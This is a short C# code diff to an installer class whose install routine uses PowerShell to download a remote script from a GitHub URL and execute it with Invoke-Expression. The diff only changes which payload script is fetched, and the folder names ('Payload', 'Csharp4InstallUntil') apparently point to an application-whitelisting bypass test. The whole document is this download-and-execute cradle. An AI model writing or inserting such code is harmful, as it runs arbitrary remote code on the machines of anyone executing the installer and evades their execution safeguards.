@@ -19,7 +19,7 @@ public class Sample : System.Configuration.Install.Installer
     {
         PowerShell ps = PowerShell.Create();
         ps.AddCommand("Invoke-Expression");
-        ps.AddArgument("IEX (New-Object Net.WebClient).DownloadString('https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/Payload/WhiteListTestScript.ps1')");
+        ps.AddArgument("IEX (New-Object Net.WebClient).DownloadString('https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/PayloadCsharp4InstallUntil/Csharp4InstallUntil.ps1')");
         ps.Invoke();
     }
 }
